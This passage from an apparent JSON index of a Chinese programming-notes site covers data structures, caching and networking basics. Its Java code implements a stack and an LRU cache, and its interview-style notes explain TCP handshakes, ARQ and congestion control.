中。示例图如下:\n3.2.2. 检查符号是否成对出现     给定一个只包括 '('，')'，'{'，'}'，'['，']' 的字符串，判断该字符串是否有效。\n有效字符串需满足：\n 左括号必须用相同类型的右括号闭合。 左括号必须以正确的顺序闭合。  比如 \u0026ldquo;()\u0026quot;、\u0026quot;()[]{}\u0026quot;、\u0026quot;{[]}\u0026rdquo; 都是有效字符串，而 \u0026ldquo;(]\u0026rdquo; 、\u0026quot;([)]\u0026quot; 则不是。\n 这个问题实际是 Leetcode 的一道题目，我们可以利用栈 Stack 来解决这个问题。\n 首先我们将括号间的对应规则存放在 Map 中，这一点应该毋容置疑； 创建一个栈。遍历字符串，如果字符是左括号就直接加入stack中，否则将stack 的栈顶元素与这个括号做比较，如果不相等就直接返回 false。遍历结束，如果stack为空，返回 true。  public boolean isValid(String s){ // 括号之间的对应规则  HashMap\u0026lt;Character, Character\u0026gt; mappings = new HashMap\u0026lt;Character, Character\u0026gt;(); mappings.put(\u0026#39;)\u0026#39;, \u0026#39;(\u0026#39;); mappings.put(\u0026#39;}\u0026#39;, \u0026#39;{\u0026#39;); mappings.put(\u0026#39;]\u0026#39;, \u0026#39;[\u0026#39;); Stack\u0026lt;Character\u0026gt; stack = new Stack\u0026lt;Character\u0026gt;(); char[] chars = s.toCharArray(); for (int i = 0; i \u0026lt; chars.length; i++) { if (mappings.containsKey(chars[i])) { char topElement = stack.empty() ? \u0026#39;#\u0026#39; : stack.pop(); if (topElement != mappings.get(chars[i])) { return false; } } else { stack.push(chars[i]); } } return stack.isEmpty(); } 3.2.3. 反转字符串    将字符串中的每个字符先入栈再出栈就可以了。\n3.2.4. 维护函数调用    最后一个被调用的函数必须先完成执行，符合栈的 后进先出（LIFO, Last In First Out） 特性。\n3.3. 栈的实现    栈既可以通过数组实现，也可以通过链表来实现。不管基于数组还是链表，入栈、出栈的时间复杂度都为 O(1)。\n下面我们使用数组来实现一个栈，并且这个栈具有push()、pop()（返回栈顶元素并出栈）、peek() （返回栈顶元素不出栈）、isEmpty()、size()这些基本的方法。\n 提示：每次入栈之前先判断栈的容量是否够用，如果不够用就用Arrays.copyOf()进行扩容；\n public class MyStack { private int[] storage;//存放栈中元素的数组  private int capacity;//栈的容量  private int count;//栈中元素数量  private static final int GROW_FACTOR = 2; //不带初始容量的构造方法。默认容量为8  public MyStack() { this.capacity = 8; this.storage=new int[8]; this.count = 0; } //带初始容量的构造方法  public MyStack(int initialCapacity) { if (initialCapacity \u0026lt; 1) throw new IllegalArgumentException(\u0026#34;Capacity too small.\u0026#34;); this.capacity = initialCapacity; this.storage = new int[initialCapacity]; this.count = 0; } //入栈  public void push(int value) { if (count == capacity) { ensureCapacity(); } storage[count++] = value; } //确保容量大小  private void ensureCapacity() { int newCapacity = capacity * GROW_FACTOR; storage = Arrays.copyOf(storage, newCapacity); capacity = newCapacity; } //返回栈顶元素并出栈  private int pop() { if (count == 0) throw new IllegalArgumentException(\u0026#34;Stack is empty.\u0026#34;); count--; return storage[count]; } //返回栈顶元素不出栈  private int peek() { if (count == 0){ throw new IllegalArgumentException(\u0026#34;Stack is empty.\u0026#34;); }else { return storage[count-1]; } } //判断栈是否为空  private boolean isEmpty() { return count == 0; } //返回栈中元素的个数  private int size() { return count; } } 验证\nMyStack myStack = new MyStack(3); myStack.push(1); myStack.push(2); myStack.push(3); myStack.push(4); myStack.push(5); myStack.push(6); myStack.push(7); myStack.push(8); System.out.println(myStack.peek());//8 System.out.println(myStack.size());//8 for (int i = 0; i \u0026lt; 8; i++) { System.out.println(myStack.pop()); } System.out.println(myStack.isEmpty());//true myStack.pop();//报错：java.lang.IllegalArgumentException: Stack is empty. 4. 队列    4.1. 队列简介    队列 是 先进先出( FIFO，First In, First Out) 的线性表。在具体应用中通常用链表或者数组来实现，用数组实现的队列叫作 顺序队列 ，用链表实现的队列叫作 链式队列 。队列只允许在后端（rear）进行插入操作也就是 入队 enqueue，在前端（front）进行删除操作也就是出队 dequeue\n队列的操作方式和堆栈类似，唯一的区别在于队列只允许新数据在后端进行添加。\n假设队列中有n个元素。 访问：O（n）//最坏情况 插入删除：O（1）//后端插入前端删除元素 4.2. 队列分类    4.2.1. 单队列    单队列就是常见的队列, 每次添加元素时，都是添加到队尾。单队列又分为 顺序队列（数组实现） 和 链式队列（链表实现）。\n顺序队列存在“假溢出”的问题也就是明明有位置却不能添加的情况。\n假设下图是一个顺序队列，我们将前两个元素 1,2 出队，并入队两个元素 7,8。当进行入队、出队操作的时候，front 和 rear 都会持续往后移动，当 rear 移动到最后的时候,我们无法再往队列中添加数据，即使数组中还有空余空间，这种现象就是 ”假溢出“ 。除了假溢出问题之外，如下图所示，当添加元素 8 的时候，rear 指针移动到数组之外（越界）。\n 为了避免当只有一个元素的时候，队头和队尾重合使处理变得麻烦，所以引入两个指针，front 指针指向对头元素，rear 指针指向队列最后一个元素的下一个位置，这样当 front 等于 rear 时，此队列不是还剩一个元素，而是空队列。——From 《大话数据结构》\n 4.2.2. 循环队列    循环队列可以解决顺序队列的假溢出和越界问题。解决办法就是：从头开始，这样也就会形成头尾相接的循环，这也就是循环队列名字的由来。\n还是用上面的图，我们将 rear 指针指向数组下标为 0 的位置就不会有越界问题了。当我们再向队列中添加元素的时候， rear 向后移动。\n顺序队列中，我们说 front==rear 的时候队列为空，循环队列中则不一样，也可能为满，如上图所示。解决办法有两种：\n 可以设置一个标志变量 flag,当 front==rear 并且 flag=0 的时候队列为空，当front==rear 并且 flag=1 的时候队列为满。 队列为空的时候就是 front==rear ，队列满的时候，我们保证数组还有一个空闲的位置，rear 就指向这个空闲位置，如下图所示，那么现在判断队列是否为满的条件就是： (rear+1) % QueueSize= front 。  4.3. 常见应用场景    当我们需要按照一定顺序来处理数据的时候可以考虑使用队列这个数据结构。\n 阻塞队列： 阻塞队列可以看成在队列基础上加了阻塞操作的队列。当队列为空的时候，出队操作阻塞，当队列满的时候，入队操作阻塞。使用阻塞队列我们可以很容易实现“生产者 - 消费者“模型。 线程池中的请求/任务队列： 线程池中没有空闲线程时，新的任务请求线程资源时，线程池该如何处理呢？答案是将这些请求放在队列中，当有空闲线程的时候，会循环中反复从队列中获取任务来执行。队列分为无界队列(基于链表)和有界队列(基于数组)。无界队列的特点就是可以一直入列，除非系统资源耗尽，比如 ：FixedThreadPool 使用无界队列 LinkedBlockingQueue。但是有界队列就不一样了，当队列满的话后面再有任务/请求就会拒绝，在 Java 中的体现就是会抛出java.util.concurrent.RejectedExecutionException 异常。 Linux 内核进程队列（按优先级排队） 现实生活中的派对，播放器上的播放列表; 消息队列 等等\u0026hellip;\u0026hellip;  "},{"id":372,"href":"/%E7%AC%94%E8%AE%B0/%E7%BC%93%E5%AD%98/","title":"缓存","parent":"笔记","content":"缓存     缓存  一、缓存特征 二、缓存位置 三、CDN 四、缓存问题 五、数据分布 六、一致性哈希 七、LRU 参考资料    一、缓存特征    命中率    当某个请求能够通过访问缓存而得到响应时，称为缓存命中。\n缓存命中率越高，缓存的利用率也就越高。\n最大空间    缓存通常位于内存中，内存的空间通常比磁盘空间小的多，因此缓存的最大空间不可能非常大。\n当缓存存放的数据量超过最大空间时，就需要淘汰部分数据来存放新到达的数据。\n淘汰策略      FIFO（First In First Out）：先进先出策略，在实时性的场景下，需要经常访问最新的数据，那么就可以使用 FIFO，使得最先进入的数据（最晚的数据）被淘汰。\n  LRU（Least Recently Used）：最近最久未使用策略，优先淘汰最久未使用的数据，也就是上次被访问时间距离现在最久的数据。该策略可以保证内存中的数据都是热点数据，也就是经常被访问的数据，从而保证缓存命中率。\n  LFU（Least Frequently Used）：最不经常使用策略，优先淘汰一段时间内使用次数最少的数据。\n  二、缓存位置    浏览器    当 HTTP 响应允许进行缓存时，浏览器会将 HTML、CSS、JavaScript、图片等静态资源进行缓存。\nISP    网络服务提供商（ISP）是网络访问的第一跳，通过将数据缓存在 ISP 中能够大大提高用户的访问速度。\n反向代理    反向代理位于服务器之前，请求与响应都需要经过反向代理。通过将数据缓存在反向代理，在用户请求反向代理时就可以直接使用缓存进行响应。\n本地缓存    使用 Guava Cache 将数据缓存在服务器本地内存中，服务器代码可以直接读取本地内存中的缓存，速度非常快。\n分布式缓存    使用 Redis、Memcache 等分布式缓存将数据缓存在分布式缓存系统中。\n相对于本地缓存来说，分布式缓存单独部署，可以根据需求分配硬件资源。不仅如此，服务器集群都可以访问分布式缓存，而本地缓存需要在服务器集群之间进行同步，实现难度和性能开销上都非常大。\n数据库缓存    MySQL 等数据库管理系统具有自己的查询缓存机制来提高查询效率。\nJava 内部的缓存    Java 为了优化空间，提高字符串、基本数据类型包装类的创建效率，设计了字符串常量池及 Byte、Short、Character、Integer、Long、Boolean 这六种包装类缓冲池。\nCPU 多级缓存    CPU 为了解决运算速度与主存 IO 速度不匹配的问题，引入了多级缓存结构，同时使用 MESI 等缓存一致性协议来解决多核 CPU 缓存数据一致性的问题。\n三、CDN    内容分发网络（Content distribution network，CDN）是一种互连的网络系统，它利用更靠近用户的服务器从而更快更可靠地将 HTML、CSS、JavaScript、音乐、图片、视频等静态资源分发给用户。\nCDN 主要有以下优点：\n 更快地将数据分发给用户； 通过部署多台服务器，从而提高系统整体的带宽性能； 多台服务器可以看成是一种冗余机制，从而具有高可用性。  \n四、缓存问题    缓存穿透    指的是对某个一定不存在的数据进行请求，该请求将会穿透缓存到达数据库。\n解决方案：\n 对这些不存在的数据缓存一个空数据； 对这类请求进行过滤。  缓存雪崩    指的是由于数据没有被加载到缓存中，或者缓存数据在同一时间大面积失效（过期），又或者缓存服务器宕机，导致大量的请求都到达数据库。\n在有缓存的系统中，系统非常依赖于缓存，缓存分担了很大一部分的数据请求。当发生缓存雪崩时，数据库无法处理这么大的请求，导致数据库崩溃。\n解决方案：\n 为了防止缓存在同一时间大面积过期导致的缓存雪崩，可以通过观察用户行为，合理设置缓存过期时间来实现； 为了防止缓存服务器宕机出现的缓存雪崩，可以使用分布式缓存，分布式缓存中每一个节点只缓存部分的数据，当某个节点宕机时可以保证其它节点的缓存仍然可用。 也可以进行缓存预热，避免在系统刚启动不久由于还未将大量数据进行缓存而导致缓存雪崩。  缓存一致性    缓存一致性要求数据更新的同时缓存数据也能够实时更新。\n解决方案：\n 在数据更新的同时立即去更新缓存； 在读缓存之前先判断缓存是否是最新的，如果不是最新的先进行更新。  要保证缓存一致性需要付出很大的代价，缓存数据最好是那些对一致性要求不高的数据，允许缓存数据存在一些脏数据。\n缓存 “无底洞” 现象    指的是为了满足业务要求添加了大量缓存节点，但是性能不但没有好转反而下降了的现象。\n产生原因：缓存系统通常采用 hash 函数将 key 映射到对应的缓存节点，随着缓存节点数目的增加，键值分布到更多的节点上，导致客户端一次批量操作会涉及多次网络操作，这意味着批量操作的耗时会随着节点数目的增加而不断增大。此外，网络连接数变多，对节点的性能也有一定影响。\n解决方案：\n 优化批量数据操作命令； 减少网络通信次数； 降低接入成本，使用长连接 / 连接池，NIO 等。  五、数据分布    哈希分布    哈希分布就是将数据计算哈希值之后，按照哈希值分配到不同的节点上。例如有 N 个节点，数据的主键为 key，则将该数据分配的节点序号为：hash(key)%N。\n传统的哈希分布算法存在一个问题：当节点数量变化时，也就是 N 值变化，那么几乎所有的数据都需要重新分布，将导致大量的数据迁移。\n顺序分布    将数据划分为多个连续的部分，按数据的 ID 或者时间分布到不同节点上。例如 User 表的 ID 范围为 1 ~ 7000，使用顺序分布可以将其划分成多个子表，对应的主键范围为 1 ~ 1000，1001 ~ 2000，\u0026hellip;，6001 ~ 7000。\n顺序分布相比于哈希分布的主要优点如下：\n 能保持数据原有的顺序； 并且能够准确控制每台服务器存储的数据量，从而使得存储空间的利用率最大。  六、一致性哈希    Distributed Hash Table（DHT） 是一种哈希分布方式，其目的是为了克服传统哈希分布在服务器节点数量变化时大量数据迁移的问题。\n基本原理    将哈希空间 [0, 2n-1] 看成一个哈希环，每个服务器节点都配置到哈希环上。每个数据对象通过哈希取模得到哈希值之后，存放到哈希环中顺时针方向第一个大于等于该哈希值的节点上。\n\n一致性哈希在增加或者删除节点时只会影响到哈希环中相邻的节点，例如下图中新增节点 X，只需要将它前一个节点 C 上的数据重新进行分布即可，对于节点 A、B、D 都没有影响。\n\n虚拟节点    上面描述的一致性哈希存在数据分布不均匀的问题，节点存储的数据量有可能会存在很大的不同。\n数据不均匀主要是因为节点在哈希环上分布的不均匀，这种情况在节点数量很少的情况下尤其明显。\n解决方式是通过增加虚拟节点，然后将虚拟节点映射到真实节点上。虚拟节点的数量比真实节点来得多，那么虚拟节点在哈希环上分布的均匀性就会比原来的真实节点好，从而使得数据分布也更加均匀。\n七、LRU    以下是基于 双向链表 + HashMap 的 LRU 算法实现，对算法的解释如下：\n 访问某个节点时，将其从原来的位置删除，并重新插入到链表头部。这样就能保证链表尾部存储的就是最近最久未使用的节点，当节点数量大于缓存最大空间时就淘汰链表尾部的节点。 为了使删除操作时间复杂度为 O(1)，就不能采用遍历的方式找到某个节点。HashMap 存储着 Key 到节点的映射，通过 Key 就能以 O(1) 的时间得到节点，然后再以 O(1) 的时间将其从双向队列中删除。  public class LRU\u0026lt;K, V\u0026gt; implements Iterable\u0026lt;K\u0026gt; { private Node head; private Node tail; private HashMap\u0026lt;K, Node\u0026gt; map; private int maxSize; private class Node { Node pre; Node next; K k; V v; public Node(K k, V v) { this.k = k; this.v = v; } } public LRU(int maxSize) { this.maxSize = maxSize; this.map = new HashMap\u0026lt;\u0026gt;(maxSize * 4 / 3); head = new Node(null, null); tail = new Node(null, null); head.next = tail; tail.pre = head; } public V get(K key) { if (!map.containsKey(key)) { return null; } Node node = map.get(key); unlink(node); appendHead(node); return node.v; } public void put(K key, V value) { if (map.containsKey(key)) { Node node = map.get(key); unlink(node); } Node node = new Node(key, value); map.put(key, node); appendHead(node); if (map.size() \u0026gt; maxSize) { Node toRemove = removeTail(); map.remove(toRemove.k); } } private void unlink(Node node) { Node pre = node.pre; Node next = node.next; pre.next = next; next.pre = pre; node.pre = null; node.next = null; } private void appendHead(Node node) { Node next = head.next; node.next = next; next.pre = node; node.pre = head; head.next = node; } private Node removeTail() { Node node = tail.pre; Node pre = node.pre; tail.pre = pre; pre.next = tail; node.pre = null; node.next = null; return node; } @Override public Iterator\u0026lt;K\u0026gt; iterator() { return new Iterator\u0026lt;K\u0026gt;() { private Node cur = head.next; @Override public boolean hasNext() { return cur != tail; } @Override public K next() { Node node = cur; cur = cur.next; return node.k; } }; } } 参考资料     大规模分布式存储系统 缓存那些事 一致性哈希算法 内容分发网络 How Aspiration CDN helps to improve your website loading speed?  "},{"id":373,"href":"/cs-basics/network/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/","title":"计算机网络","parent":"network","content":"一 OSI 与 TCP/IP 各层的结构与功能,都有哪些协议?    学习计算机网络时我们一般采用折中的办法，也就是中和 OSI 和 TCP/IP 的优点，采用一种只有五层协议的体系结构，这样既简洁又能将概念阐述清楚。\n结合互联网的情况，自上而下地，非常简要的介绍一下各层的作用。\n1.1 应用层    应用层(application-layer）的任务是通过应用进程间的交互来完成特定网络应用。应用层协议定义的是应用进程（进程：主机中正在运行的程序）间的通信和交互的规则。对于不同的网络应用需要不同的应用层协议。在互联网中应用层协议很多，如域名系统 DNS，支持万维网应用的 HTTP 协议，支持电子邮件的 SMTP 协议等等。我们把应用层交互的数据单元称为报文。\n域名系统\n 域名系统(Domain Name System 缩写 DNS，Domain Name 被译为域名)是因特网的一项核心服务，它作为可以将域名和 IP 地址相互映射的一个分布式数据库，能够使人更方便的访问互联网，而不用去记住能够被机器直接读取的 IP 数串。（百度百科）例如：一个公司的 Web 网站可看作是它在网上的门户，而域名就相当于其门牌地址，通常域名都使用该公司的名称或简称。例如上面提到的微软公司的域名，类似的还有：IBM 公司的域名是 www.ibm.com、Oracle 公司的域名是 www.oracle.com、Cisco 公司的域名是 www.cisco.com 等。\n HTTP 协议\n 超文本传输协议（HTTP，HyperText Transfer Protocol)是互联网上应用最为广泛的一种网络协议。所有的 WWW（万维网） 文件都必须遵守这个标准。设计 HTTP 最初的目的是为了提供一种发布和接收 HTML 页面的方法。（百度百科）\n 1.2 运输层    运输层(transport layer)的主要任务就是负责向两台主机进程之间的通信提供通用的数据传输服务。应用进程利用该服务传送应用层报文。“通用的”是指并不针对某一个特定的网络应用，而是多种应用可以使用同一个运输层服务。由于一台主机可同时运行多个线程，因此运输层有复用和分用的功能。所谓复用就是指多个应用层进程可同时使用下面运输层的服务，分用和复用相反，是运输层把收到的信息分别交付上面应用层中的相应进程。\n运输层主要使用以下两种协议:\n 传输控制协议 TCP（Transmission Control Protocol）\u0026ndash;提供面向连接的，可靠的数据传输服务。 用户数据协议 UDP（User Datagram Protocol）\u0026ndash;提供无连接的，尽最大努力的数据传输服务（不保证数据传输的可靠性）。  TCP 与 UDP 的对比见问题三。\n1.3 网络层    在计算机网络中进行通信的两个计算机之间可能会经过很多个数据链路，也可能还要经过很多通信子网。网络层的任务就是选择合适的网间路由和交换结点， 确保数据及时传送。 在发送数据时，网络层把运输层产生的报文段或用户数据报封装成分组和包进行传送。在 TCP/IP 体系结构中，由于网络层使用 IP 协议，因此分组也叫 IP 数据报 ，简称 数据报。\n这里要注意：不要把运输层的“用户数据报 UDP ”和网络层的“ IP 数据报”弄混。另外，无论是哪一层的数据单元，都可笼统地用“分组”来表示。\n这里强调指出，网络层中的“网络”二字已经不是我们通常谈到的具体网络，而是指计算机网络体系结构模型中第三层的名称.\n互联网是由大量的异构（heterogeneous）网络通过路由器（router）相互连接起来的。互联网使用的网络层协议是无连接的网际协议（Internet Protocol）和许多路由选择协议，因此互联网的网络层也叫做网际层或IP 层。\n1.4 数据链路层    数据链路层(data link layer)通常简称为链路层。两台主机之间的数据传输，总是在一段一段的链路上传送的，这就需要使用专门的链路层的协议。 在两个相邻节点之间传送数据时，数据链路层将网络层交下来的 IP 数据报组装成帧，在两个相邻节点间的链路上传送帧。每一帧包括数据和必要的控制信息（如同步信息，地址信息，差错控制等）。\n在接收数据时，控制信息使接收端能够知道一个帧从哪个比特开始和到哪个比特结束。这样，数据链路层在收到一个帧后，就可从中提出数据部分，上交给网络层。 控制信息还使接收端能够检测到所收到的帧中有无差错。如果发现差错，数据链路层就简单地丢弃这个出了差错的帧，以避免继续在网络中传送下去白白浪费网络资源。如果需要改正数据在链路层传输时出现差错（这就是说，数据链路层不仅要检错，而且还要纠错），那么就要采用可靠性传输协议来纠正出现的差错。这种方法会使链路层的协议复杂些。\n1.5 物理层    在物理层上所传送的数据单位是比特。\n物理层(physical layer)的作用是实现相邻计算机节点之间比特流的透明传送，尽可能屏蔽掉具体传输介质和物理设备的差异， 使其上面的数据链路层不必考虑网络的具体传输介质是什么。“透明传送比特流”表示经实际电路传送后的比特流没有发生变化，对传送的比特流来说，这个电路好像是看不见的。\n在互联网使用的各种协议中最重要和最著名的就是 TCP/IP 两个协议。现在人们经常提到的 TCP/IP 并不一定单指 TCP 和 IP 这两个具体的协议，而往往表示互联网所使用的整个 TCP/IP 协议族。\n1.6 总结一下    上面我们对计算机网络的五层体系结构有了初步的了解，下面附送一张七层体系结构图总结一下（图片来源于网络）。\n二 TCP 三次握手和四次挥手(面试常客)    为了准确无误地把数据送达目标处，TCP 协议采用了三次握手策略。\n2.1 TCP 三次握手漫画图解    如下图所示，下面的两个机器人通过 3 次握手确定了对方能正确接收和发送消息(图片来源：《图解 HTTP》)。 简单示意图：  客户端–发送带有 SYN 标志的数据包–一次握手–服务端 服务端–发送带有 SYN/ACK 标志的数据包–二次握手–客户端 客户端–发送带有带有 ACK 标志的数据包–三次握手–服务端  详细示意图（图片来源不详）\n2.2 为什么要三次握手    三次握手的目的是建立可靠的通信信道，说到通讯，简单来说就是数据的发送与接收，而三次握手最主要的目的就是双方确认自己与对方的发送与接收是正常的。\n第一次握手：Client 什么都不能确认；Server 确认了对方发送正常，自己接收正常\n第二次握手：Client 确认了：自己发送、接收正常，对方发送、接收正常；Server 确认了：对方发送正常，自己接收正常\n第三次握手：Client 确认了：自己发送、接收正常，对方发送、接收正常；Server 确认了：自己发送、接收正常，对方发送、接收正常\n所以三次握手就能确认双发收发功能都正常，缺一不可。\n2.3 第 2 次握手传回了 ACK，为什么还要传回 SYN？    接收端传回发送端所发送的 ACK 是为了告诉客户端，我接收到的信息确实就是你所发送的信号了，这表明从客户端到服务端的通信是正常的。而回传 SYN 则是为了建立并确认从服务端到客户端的通信。”\n SYN 同步序列编号(Synchronize Sequence Numbers) 是 TCP/IP 建立连接时使用的握手信号。在客户机和服务器之间建立正常的 TCP 网络连接时，客户机首先发出一个 SYN 消息，服务器使用 SYN-ACK 应答表示接收到了这个消息，最后客户机再以 ACK(Acknowledgement）消息响应。这样在客户机和服务器之间才能建立起可靠的 TCP 连接，数据才可以在客户机和服务器之间传递。\n 2.5 为什么要四次挥手    断开一个 TCP 连接则需要“四次挥手”：\n 客户端-发送一个 FIN，用来关闭客户端到服务器的数据传送 服务器-收到这个 FIN，它发回一 个 ACK，确认序号为收到的序号加 1 。和 SYN 一样，一个 FIN 将占用一个序号 服务器-关闭与客户端的连接，发送一个 FIN 给客户端 客户端-发回 ACK 报文确认，并将确认序号设置为收到序号加 1  任何一方都可以在数据传送结束后发出连接释放的通知，待对方确认后进入半关闭状态。当另一方也没有数据再发送的时候，则发出连接释放通知，对方确认后就完全关闭了 TCP 连接。\n举个例子：A 和 B 打电话，通话即将结束后，A 说“我没啥要说的了”，B 回答“我知道了”，但是 B 可能还会有要说的话，A 不能要求 B 跟着自己的节奏结束通话，于是 B 可能又巴拉巴拉说了一通，最后 B 说“我说完了”，A 回答“知道了”，这样通话才算结束。\n上面讲的比较概括，推荐一篇讲的比较细致的文章：https://blog.csdn.net/qzcsu/article/details/72861891\n三 TCP,UDP 协议的区别    UDP 在传送数据之前不需要先建立连接，远地主机在收到 UDP 报文后，不需要给出任何确认。虽然 UDP 不提供可靠交付，但在某些情况下 UDP 却是一种最有效的工作方式（一般用于即时通信），比如： QQ 语音、 QQ 视频 、直播等等\nTCP 提供面向连接的服务。在传送数据之前必须先建立连接，数据传送结束后要释放连接。 TCP 不提供广播或多播服务。由于 TCP 要提供可靠的，面向连接的传输服务（TCP 的可靠体现在 TCP 在传递数据之前，会有三次握手来建立连接，而且在数据传递时，有确认、窗口、重传、拥塞控制机制，在数据传完后，还会断开连接用来节约系统资源），这一难以避免增加了许多开销，如确认，流量控制，计时器以及连接管理等。这不仅使协议数据单元的首部增大很多，还要占用许多处理机资源。TCP 一般用于文件传输、发送和接收邮件、远程登录等场景。\n四 TCP 协议如何保证可靠传输     应用数据被分割成 TCP 认为最适合发送的数据块。 TCP 给发送的每一个包进行编号，接收方对数据包进行排序，把有序数据传送给应用层。 校验和： TCP 将保持它首部和数据的检验和。这是一个端到端的检验和，目的是检测数据在传输过程中的任何变化。如果收到段的检验和有差错，TCP 将丢弃这个报文段和不确认收到此报文段。 TCP 的接收端会丢弃重复的数据。 流量控制： TCP 连接的每一方都有固定大小的缓冲空间，TCP 的接收端只允许发送端发送接收端缓冲区能接纳的数据。当接收方来不及处理发送方的数据，能提示发送方降低发送的速率，防止包丢失。TCP 使用的流量控制协议是可变大小的滑动窗口协议。 （TCP 利用滑动窗口实现流量控制） 拥塞控制： 当网络拥塞时，减少数据的发送。 ARQ 协议： 也是为了实现可靠传输的，它的基本原理就是每发完一个分组就停止发送，等待对方确认。在收到确认后再发下一个分组。 超时重传： 当 TCP 发出一个段后，它启动一个定时器，等待目的端确认收到这个报文段。如果不能及时收到一个确认，将重发这个报文段。  4.1 ARQ 协议    自动重传请求（Automatic Repeat-reQuest，ARQ）是 OSI 模型中数据链路层和传输层的错误纠正协议之一。它通过使用确认和超时这两个机制，在不可靠服务的基础上实现可靠的信息传输。如果发送方在发送后一段时间之内没有收到确认帧，它通常会重新发送。ARQ 包括停止等待 ARQ 协议和连续 ARQ 协议。\n停止等待 ARQ 协议    停止等待协议是为了实现可靠传输的，它的基本原理就是每发完一个分组就停止发送，等待对方确认（回复 ACK）。如果过了一段时间（超时时间后），还是没有收到 ACK 确认，说明没有发送成功，需要重新发送，直到收到确认后再发下一个分组。\n在停止等待协议中，若接收方收到重复分组，就丢弃该分组，但同时还要发送确认。\n优缺点：\n 优点： 简单 缺点： 信道利用率低，等待时间长  1) 无差错情况:\n发送方发送分组,接收方在规定时间内收到,并且回复确认.发送方再次发送。\n2) 出现差错情况（超时重传）:\n停止等待协议中超时重传是指只要超过一段时间仍然没有收到确认，就重传前面发送过的分组（认为刚才发送过的分组丢失了）。因此每发送完一个分组需要设置一个超时计时器，其重传时间应比数据在分组传输的平均往返时间更长一些。这种自动重传方式常称为 自动重传请求 ARQ 。另外在停止等待协议中若收到重复分组，就丢弃该分组，但同时还要发送确认。连续 ARQ 协议 可提高信道利用率。发送维持一个发送窗口，凡位于发送窗口内的分组可连续发送出去，而不需要等待对方确认。接收方一般采用累积确认，对按序到达的最后一个分组发送确认，表明到这个分组位置的所有分组都已经正确收到了。\n3) 确认丢失和确认迟到\n 确认丢失 ：确认消息在传输过程丢失。当 A 发送 M1 消息，B 收到后，B 向 A 发送了一个 M1 确认消息，但却在传输过程中丢失。而 A 并不知道，在超时计时过后，A 重传 M1 消息，B 再次收到该消息后采取以下两点措施：1. 丢弃这个重复的 M1 消息，不向上层交付。 2. 向 A 发送确认消息。（不会认为已经发送过了，就不再发送。A 能重传，就证明 B 的确认消息丢失）。 确认迟到 ：确认消息在传输过程中迟到。A 发送 M1 消息，B 收到并发送确认。在超时时间内没有收到确认消息，A 重传 M1 消息，B 仍然收到并继续发送确认消息（B 收到了 2 份 M1）。此时 A 收到了 B 第二次发送的确认消息。接着发送其他数据。过了一会，A 收到了 B 第一次发送的对 M1 的确认消息（A 也收到了 2 份确认消息）。处理如下：1. A 收到重复的确认后，直接丢弃。2. B 收到重复的 M1 后，也直接丢弃重复的 M1。  连续 ARQ 协议    连续 ARQ 协议可提高信道利用率。发送方维持一个发送窗口，凡位于发送窗口内的分组可以连续发送出去，而不需要等待对方确认。接收方一般采用累计确认，对按序到达的最后一个分组发送确认，表明到这个分组为止的所有分组都已经正确收到了。\n优缺点：\n 优点： 信道利用率高，容易实现，即使确认丢失，也不必重传。 缺点： 不能向发送方反映出接收方已经正确收到的所有分组的信息。 比如：发送方发送了 5 条 消息，中间第三条丢失（3 号），这时接收方只能对前两个发送确认。发送方无法知道后三个分组的下落，而只好把后三个全部重传一次。这也叫 Go-Back-N（回退 N），表示需要退回来重传已经发送过的 N 个消息。  4.2 滑动窗口和流量控制    TCP 利用滑动窗口实现流量控制。流量控制是为了控制发送方发送速率，保证接收方来得及接收。 接收方发送的确认报文中的窗口字段可以用来控制发送方窗口大小，从而影响发送方的发送速率。将窗口字段设置为 0，则发送方不能发送数据。\n4.3 拥塞控制    在某段时间，若对网络中某一资源的需求超过了该资源所能提供的可用部分，网络的性能就要变坏。这种情况就叫拥塞。拥塞控制就是为了防止过多的数据注入到网络中，这样就可以使网络中的路由器或链路不致过载。拥塞控制所要做的都有一个前提，就是网络能够承受现有的网络负荷。拥塞控制是一个全局性的过程，涉及到所有的主机，所有的路由器，以及与降低网络传输性能有关的所有因素。相反，流量控制往往是点对点通信量的控制，是个端到端的问题。流量控制所要做到的就是抑制发送端发送数据的速率，以便使接收端来得及接收。\n为了进行拥塞控制，TCP 发送方要维持一个 拥塞窗口(cwnd) 的状态变量。拥塞控制窗口的大小取决于网络的拥塞程度，并且动态变化。发送方让自己的发送窗口取为拥塞窗口和接收方的接受窗口中较小的一个。\nTCP 的拥塞控制采用了四种算法，即 慢开始 、 拥塞避免 、快重传 和 快恢复。在网络层也可以使路由器采用适当的分组丢弃策略（如主动队列管理 AQM），以减少网络拥塞的发生。\n 慢开始： 慢开始算法的思路是当主机开始发送数据时，如果立即把大量数据字节注入到网络，那么可能会引起网络阻塞，因为现在还不知道网络的符合情况。经验表明，较好的方法是先探测一下，即由小到大逐渐增大发送窗口，也就是由小到大逐渐增大拥塞窗口数值。cwnd 初始值为 1，每经过一个传播轮次，cwnd 加倍。 拥塞避免： 拥塞避免算法的思路是让拥塞窗口 cwnd 缓慢增大，即每经过一个往返时间 RTT 就把发送放的 cwnd 加 1. 快重传与快恢复： 在 TCP/IP 中，快速重传和恢复（fast retransmit and recovery，FRR）是一种拥塞控制算法，它能快速恢复丢失的数据包。没有 FRR，如果数据包丢失了，TCP 将会使用定时器来要求传输暂停。在暂停的这段时间内，没有新的或复制的数据包被发送。有了 FRR，如果接收机接收到一个不按顺序的数据段，它会立即给发送机发送一个重复确认。如果发送机接收到三个重复确认，它会假定确认件指出的数据段丢失了，并立即重传这些丢失的数据段。有了 FRR，就不会因为重传时要求的暂停被耽误。 当有单独的数据包丢失时，快速重传和恢复（FRR）能最有效地工作。当有多个数据信息包在某一段很短的时间内丢失时，它则不能很有效地工作。  五 在浏览器中输入 url 地址 -\u0026raquo; 显示主页的过程(面试常客)    百度好像最喜欢问这个问题。\n 打开一个网页，整个过程会使用哪些协议？\n 图解（图片来源：《图解 HTTP》）：\n 上图有一个错误，请注意，是 OSPF 不是 OPSF。 OSPF（Open Shortest Path First，ospf）开放最短路径优先协议,是由 Internet 工程任务组开发的路由选择协议\n 总体来说分为以下几个过程:\n DNS 解析 TCP 连接 发送 HTTP 请求 服务器处理请求并返回 HTTP 报文 浏览器解析渲染页面 连接结束  具体可以参考下面这篇文章：\n https://segmentfault.com/a/1190000006879700  六 状态码    七 各种协议与 HTTP 协议之间的关系    一般面试官会通过这样的问题来考察你对计算机网络知识体系的理解。\n图片来源：《图解 HTTP》\n八 HTTP 长连接,短连接    在 HTTP/1.0 中默认使用短连接。也就是说，客户端和服务器每进行一次 HTTP 